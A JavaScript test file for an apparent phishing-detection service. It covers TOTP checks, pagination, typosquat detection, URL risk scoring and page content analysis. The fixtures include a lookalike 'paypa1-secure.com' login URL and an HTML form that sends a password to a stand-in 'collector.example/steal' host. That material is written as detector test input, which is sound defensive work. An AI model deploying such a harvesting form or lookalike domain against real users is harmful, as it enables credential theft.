const test = require("node:test");
const assert = require("node:assert/strict");
const { generateMfaSecret, generateTotp, verifyTotp } = require("../src/utils/mfa");
const { buildPaginationMeta, getPagination } = require("../src/utils/pagination");
const { analyzePageContent } = require("../src/services/contentAnalysisService");
const { checkTyposquatting } = require("../src/services/typosquattingService");
const { extractUrlFeatures, scoreUrlFeatures } = require("../src/services/mlScorerService");
const { computeFinalScore } = require("../src/services/detectionService");

test("TOTP verifier accepts the current authenticator code", () => {
  const secret = generateMfaSecret();
  const code = generateTotp(secret);

  assert.equal(verifyTotp(secret, code), true);
});

test("TOTP verifier rejects malformed codes", () => {
  const secret = generateMfaSecret();

  assert.equal(verifyTotp(secret, "abc123"), false);
  assert.equal(verifyTotp(secret, "123"), false);
});

test("pagination clamps unsafe page sizes", () => {
  const pagination = getPagination({ page: "2", page_size: "1000" });

  assert.deepEqual(pagination, {
    limit: 100,
    offset: 100,
    page: 2,
    pageSize: 100,
  });
});

test("pagination metadata reports total pages", () => {
  assert.deepEqual(buildPaginationMeta({ count: 51, page: 2, pageSize: 25 }), {
    total: 51,
    page: 2,
    page_size: 25,
    total_pages: 3,
  });
});

test("typosquatting detects brand impersonation with substitutions and suffixes", () => {
  const result = checkTyposquatting("paypa1-secure.com");

  assert.equal(result.isTyposquat, true);
  assert.equal(result.matchedBrand, "paypal");
  assert.equal(result.attackType, "character_substitution");
  assert.equal(result.editDistance, 1);
});

test("typosquatting does not flag exact trusted brand domains", () => {
  const result = checkTyposquatting("paypal.com");

  assert.equal(result.isTyposquat, false);
});

test("URL ML scorer gives high risk to credential-harvesting URL patterns", () => {
  const features = extractUrlFeatures("http://paypa1-secure.com/login/verify-password");
  const score = scoreUrlFeatures(features);

  assert.equal(features.hasHttps, 0);
  assert.equal(features.digitCount, 1);
  assert.equal(features.hyphenCount, 1);
  assert.equal(features.credentialPathKeywordCount >= 3, true);
  assert.equal(score >= 90, true);
});

test("confirmed phishing threat intelligence cannot be averaged down to suspicious", () => {
  const score = computeFinalScore(
    { rules: 26, blacklist: 95, ml: 10, content: 0 },
    { rules: 0.35, blacklist: 0.30, ml: 0.25, content: 0.10 },
    ["rules", "blacklist", "ml"],
    { is_blacklisted: true, threat_type: "phishing", reputation_score: 95 },
  );

  assert.equal(score >= 70, true);
});

test("content analysis detects credential forms and title/domain mismatch", () => {
  const html = `
    <html>
      <head><title>PayPal Account Verification</title></head>
      <body>
        <form action="https://collector.example/steal">
          <input type="password" name="password" />
        </form>
      </body>
    </html>
  `;

  const result = analyzePageContent(html, "https://paypa1-secure.com/login");

  assert.equal(result.hasCredentialHarvester, true);
  assert.equal(result.hasTitleMismatch, true);
});
